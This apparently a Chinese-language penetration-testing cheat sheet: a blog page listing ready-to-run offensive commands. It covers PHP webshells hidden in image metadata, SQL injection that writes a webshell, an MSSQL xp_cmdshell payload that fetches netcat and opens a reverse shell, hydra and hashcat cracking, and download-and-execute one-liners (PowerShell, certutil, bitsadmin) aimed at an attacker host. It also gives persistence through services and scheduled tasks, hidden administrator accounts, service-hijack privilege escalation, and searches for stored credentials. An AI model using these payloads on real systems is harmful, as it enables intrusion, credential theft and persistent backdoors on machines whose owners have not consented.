<h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>图片文件后门语句注入</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exiv2 -c&#x27;A &quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;!&#x27; backdoor.jpeg</span><br><span class="line">exiftool “-comment&lt;=back.php” back.png</span><br></pre></td></tr></table></figure>
<h3 id="htaccess文件配置"><a href="#htaccess文件配置" class="headerlink" title=".htaccess文件配置"></a>.htaccess文件配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传.htaccess文件将.blah文件解析为.php文件</span></span><br><span class="line">AddType application/x-httpd-php .blah</span><br></pre></td></tr></table></figure>
<h3 id="SQL注入上传WebShell"><a href="#SQL注入上传WebShell" class="headerlink" title="SQL注入上传WebShell"></a>SQL注入上传WebShell</h3><p>手工：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Assumed 3 columns</span><br><span class="line">http://target/index.php?vulnParam=0&#x27; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj</span><br></pre></td></tr></table></figure>
<p>SQLMap</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sqlmap; post-request - captured request via Burp Proxy via Save Item to File.</span></span><br><span class="line">sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 10</span><br></pre></td></tr></table></figure>
<p>NetCat(适用于xp_cmdshell可用的SQL Server)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">netcat reverse shell via mssql injection when xp_cmdshell is available</span></span><br><span class="line">1000&#x27;;+exec+master.dbo.xp_cmdshell+&#x27;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#x27;;--</span><br></pre></td></tr></table></figure>

<h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><h3 id="hydra破解Web服务密码"><a href="#hydra破解Web服务密码" class="headerlink" title="hydra破解Web服务密码"></a>hydra破解Web服务密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list</span><br></pre></td></tr></table></figure>
<h3 id="hydra破解通用协议口令"><a href="#hydra破解通用协议口令" class="headerlink" title="hydra破解通用协议口令"></a>hydra破解通用协议口令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Bruteforce based on the pattern;</span></span><br><span class="line">hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Generate password candidates: wordlist + pattern;</span></span><br><span class="line">hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Generate NetNLTMv2 with internalMonologue and crack with hashcat</span></span><br><span class="line">InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">resulting <span class="built_in">hash</span></span></span><br><span class="line">spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">crack with hashcat</span></span><br><span class="line">hashcat -m5600 &#x27;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#x27; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable</span><br></pre></td></tr></table></figure>
<h3 id="破解zip文件密码"><a href="#破解zip文件密码" class="headerlink" title="破解zip文件密码"></a>破解zip文件密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip</span><br></pre></td></tr></table></figure>

<h2 id="本地信息挖掘"><a href="#本地信息挖掘" class="headerlink" title="本地信息挖掘"></a>本地信息挖掘</h2><h3 id="寻找可读-写文件夹"><a href="#寻找可读-写文件夹" class="headerlink" title="寻找可读&#x2F;写文件夹"></a>寻找可读&#x2F;写文件夹</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-ChildItem</span> <span class="string">&quot;c:\windows\&quot;</span> <span class="literal">-recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"><span class="variable">$a</span> | % &#123;</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$_</span>.fullname</span><br><span class="line">    <span class="variable">$acls</span> = <span class="built_in">get-acl</span> <span class="variable">$fileName</span>  <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">select</span> <span class="literal">-exp</span> access | ? &#123;<span class="variable">$_</span>.filesystemrights <span class="operator">-match</span> <span class="string">&quot;full|modify|write&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.identityreference <span class="operator">-match</span> <span class="string">&quot;authenticated users|everyone|<span class="variable">$env:username</span>&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$acls</span> <span class="operator">-ne</span> <span class="variable">$null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="type">pscustomobject</span>]<span class="selector-tag">@</span>&#123;</span><br><span class="line">            filename = <span class="variable">$fileName</span></span><br><span class="line">            user = <span class="variable">$acls</span> | <span class="built_in">select</span> <span class="literal">-exp</span> identityreference</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="检查是否已启用Powershell日志记录"><a href="#检查是否已启用Powershell日志记录" class="headerlink" title="检查是否已启用Powershell日志记录"></a>检查是否已启用Powershell日志记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</span><br></pre></td></tr></table></figure>
<h3 id="检查WinEvent日志中是否有SecureString"><a href="#检查WinEvent日志中是否有SecureString" class="headerlink" title="检查WinEvent日志中是否有SecureString"></a>检查WinEvent日志中是否有SecureString</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;Microsoft-Windows-PowerShell/Operational&#x27;</span>; ID=<span class="number">4104</span>&#125; | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Message | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&#x27;SecureString&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="检查WinEvent的机器唤醒-睡眠时间"><a href="#检查WinEvent的机器唤醒-睡眠时间" class="headerlink" title="检查WinEvent的机器唤醒&#x2F;睡眠时间"></a>检查WinEvent的机器唤醒&#x2F;睡眠时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#x27;Microsoft-Windows-Power-TroubleShooter&#x27;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#x27;Sleep&#x27;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#x27;Wake&#x27;;e=&#123;$_.Properties[1].Value&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">TFTP Linux: <span class="built_in">cat</span> /etc/default/atftpd to find out file serving location; default <span class="keyword">in</span> kali /srv/tftp</span></span><br><span class="line">service atftpd start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">tftp -i $ATTACKER get /download/location/file /save/location/file</span><br></pre></td></tr></table></figure>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux: <span class="built_in">set</span> up ftp server with anonymous logon access;</span></span><br><span class="line">twistd -n ftp -p 21 -r /file/to/serve</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows shell: <span class="built_in">read</span> FTP commands from ftp-commands.txt non-interactively;</span></span><br><span class="line">echo open $ATTACKER&gt;ftp-commands.txt</span><br><span class="line">echo anonymous&gt;&gt;ftp-commands.txt</span><br><span class="line">echo whatever&gt;&gt;ftp-commands.txt</span><br><span class="line">echo binary&gt;&gt;ftp-commands.txt</span><br><span class="line">echo get file.exe&gt;&gt;ftp-commands.txt</span><br><span class="line">echo bye&gt;&gt;ftp-commands.txt </span><br><span class="line">ftp -s:ftp-commands.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Or just a one-liner</span></span><br><span class="line">(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd</span><br></pre></td></tr></table></figure>
<h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe</span><br></pre></td></tr></table></figure>
<h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&#x27;http://10.11.0.245/nc.exe&#x27;, &#x27;C:\\Temp\\nc.exe&#x27;)&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/nc.exe&#x27;,&#x27;nc.exe&#x27;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;</span><br><span class="line">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/nc.exe&#x27;,&#x27;nc.exe&#x27;); Start-Process nc.exe -NoNewWindow -Argumentlist &#x27;$ATTACKER 4444 -e cmd.exe&#x27;&quot; &#125;</span><br><span class="line">powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/nc.exe&#x27;,&#x27;nc.exe&#x27;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#x27;$ATTACKER 4444 -e cmd.exe&#x27;&quot;</span><br><span class="line">powershell (New-Object System.Net.WebClient).DownloadFile(&#x27;http://$ATTACKER/file.exe&#x27;,&#x27;file.exe&#x27;);(New-Object -com Shell.Application).ShellExecute(&#x27;file.exe&#x27;);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">download using default proxy credentials and launch</span></span><br><span class="line">powershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#x27;$ATTACKER 4444 -e cmd.exe&#x27;&quot; &#125;</span><br></pre></td></tr></table></figure>
<h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe</span><br></pre></td></tr></table></figure>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://$ATTACKER/file</span><br><span class="line">curl http://$ATTACKER/file -O</span><br><span class="line">scp ~/file/file.bin user@$TARGET:tmp/backdoor.py</span><br></pre></td></tr></table></figure>
<h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attacker</span></span><br><span class="line">nc -l -p 4444 &lt; /tool/file.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Victim</span></span><br><span class="line">nc $ATTACKER 4444 &gt; file.exe</span><br></pre></td></tr></table></figure>
<h3 id="Windows-“debug-exe”-Method"><a href="#Windows-“debug-exe”-Method" class="headerlink" title="Windows “debug.exe” Method"></a>Windows “debug.exe” Method</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. In Linux, convert binary to hex ascii:</span></span><br><span class="line">wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. Paste nc.txt into Windows Shell.</span></span><br></pre></td></tr></table></figure>
<h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</span><br></pre></td></tr></table></figure>

<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="利用服务进行持久化"><a href="#利用服务进行持久化" class="headerlink" title="利用服务进行持久化"></a>利用服务进行持久化</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cmd</span></span><br><span class="line">sc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">powersehll</span></span><br><span class="line">New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#x27;C:\Program Files\NotEvil\back.exe&#x27;&quot; -Description &quot;Not at all&quot;</span><br></pre></td></tr></table></figure>
<h3 id="创建持久化后门"><a href="#创建持久化后门" class="headerlink" title="创建持久化后门"></a>创建持久化后门</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Launch evil.exe every 10 minutes</span></span><br><span class="line">schtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe</span><br></pre></td></tr></table></figure>
<h3 id="创建用户并添加到本地管理员组"><a href="#创建用户并添加到本地管理员组" class="headerlink" title="创建用户并添加到本地管理员组"></a>创建用户并添加到本地管理员组</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user spotless spotless /add &amp; net localgroup Administrators spotless /add</span><br></pre></td></tr></table></figure>
<h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f</span><br></pre></td></tr></table></figure>
<h3 id="利用服务配置错误进行提权"><a href="#利用服务配置错误进行提权" class="headerlink" title="利用服务配置错误进行提权"></a>利用服务配置错误进行提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Look <span class="keyword">for</span> SERVICE_ALL_ACCESS <span class="keyword">in</span> the output</span></span><br><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line"></span><br><span class="line">sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">sc qc [service_name] (to verify!)</span><br><span class="line">sc start [service_name]</span><br></pre></td></tr></table></figure>
<h3 id="递归查找隐藏文件"><a href="#递归查找隐藏文件" class="headerlink" title="递归查找隐藏文件"></a>递归查找隐藏文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /A:H /s &quot;c:\program files&quot;</span><br></pre></td></tr></table></figure>
<h3 id="检查文件-目录权限"><a href="#检查文件-目录权限" class="headerlink" title="检查文件&#x2F;目录权限"></a>检查文件&#x2F;目录权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls.exe C:\folder /findsid userName-or-*sid /t</span><br><span class="line">//look for (F)ull, (M)odify, (W)rite</span><br></pre></td></tr></table></figure>
<h3 id="检查Windows存储的凭据"><a href="#检查Windows存储的凭据" class="headerlink" title="检查Windows存储的凭据"></a>检查Windows存储的凭据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">c:\unattend.xml</span><br><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">dir c:\*vnc.ini /s /b</span><br><span class="line">dir c:\*ultravnc.ini /s /b </span><br><span class="line">dir c:\ /s /b | findstr /si *vnc.ini</span><br><span class="line"></span><br><span class="line">findstr /si password *.txt | *.xml | *.ini</span><br><span class="line">findstr /si pass *.txt | *.xml | *.ini</span><br><span class="line">dir /s *cred* == *pass* == *.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows Autologon</span></span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VNC</span></span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Putty</span></span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Registry</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s </span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
<h3 id="检查未注册（引用）的服务"><a href="#检查未注册（引用）的服务" class="headerlink" title="检查未注册（引用）的服务"></a>检查未注册（引用）的服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="开启进程"><a href="#开启进程" class="headerlink" title="开启进程"></a>开启进程</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires PSRemoting</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">username = <span class="string">&#x27;Administrator&#x27;</span>;<span class="variable">$password</span> = <span class="string">&#x27;1234test&#x27;</span>;<span class="variable">$securePassword</span> = ConvertTo-SecureString <span class="variable">$password</span> -AsPlainText -Force;<span class="variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;Invoke-Command -Credential <span class="variable">$credential</span> -ComputerName COMPUTER_NAME -Command &#123; <span class="built_in">whoami</span> &#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">without PSRemoting</span></span><br><span class="line"><span class="meta prompt_">cmd&gt; </span><span class="language-bash">powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential <span class="string">&#x27;username&#x27;</span>, (ConvertTo-SecureString <span class="string">&#x27;password&#x27;</span> -AsPlainText -Force))</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">without PS Remoting, with arguments</span></span><br><span class="line"><span class="meta prompt_">cmd&gt; </span><span class="language-bash">powershell -<span class="built_in">command</span> <span class="string">&quot;start-process cmd.exe -argumentlist &#x27;/c calc&#x27; -Credential (New-Object System.Management.Automation.PSCredential &#x27;username&#x27;,(ConvertTo-SecureString &#x27;password&#x27; -AsPlainText -Force))&quot;</span></span></span><br></pre></td></tr></table></figure>
<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Requires interactive console</span></span><br><span class="line">runas /user:userName cmd.exe</span><br></pre></td></tr></table></figure>
<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe</span><br></pre></td></tr></table></figure>
<h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe</span><br></pre></td></tr></table></figure>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Listen on <span class="built_in">local</span> port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: access a host that<span class="string">&#x27;s being blocked by a firewall via SSH_SERVER;</span></span></span><br><span class="line">ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER</span><br></pre></td></tr></table></figure>
<h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Listen on <span class="built_in">local</span> port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;</span></span><br><span class="line">ssh -D 127.0.0.1:8080 user@SSH_SERVER</span><br></pre></td></tr></table></figure>
